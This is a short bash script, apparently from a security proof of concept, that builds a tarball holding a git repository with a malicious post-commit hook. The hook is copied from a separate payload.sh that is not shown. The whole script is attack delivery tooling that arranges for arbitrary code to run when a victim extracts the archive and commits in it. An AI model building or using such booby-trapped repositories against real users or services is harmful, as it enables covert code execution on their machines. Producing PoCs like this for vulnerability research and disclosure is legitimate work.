#! /usr/bin/env bash
# Generates a PoC tarball

set -e

# The malicious payload to run after committing
PAYLOAD="$(realpath "$(dirname -- "${BASH_SOURCE[0]}")/payload.sh")"
PREPARE_REPO="$(realpath "$(dirname -- "${BASH_SOURCE[0]}")/prepare-git-repo.sh")"

REPO="$(mktemp -d)"
echo "Creating repo with malicious git hook at $REPO..." >&2

cd "$REPO"
git init
touch file
git add file
cp "$PAYLOAD" ./.git/hooks/post-commit # Post commit hook
chmod a+x ./.git/hooks/post-commit

REPO_TAR="$(mktemp /tmp/malrepo.XXXXXXXXXX.tar.gz)"
echo "Creating tarball at $REPO_TAR..." >&2

"$PREPARE_REPO" . "$REPO_TAR"

echo "$REPO_TAR"
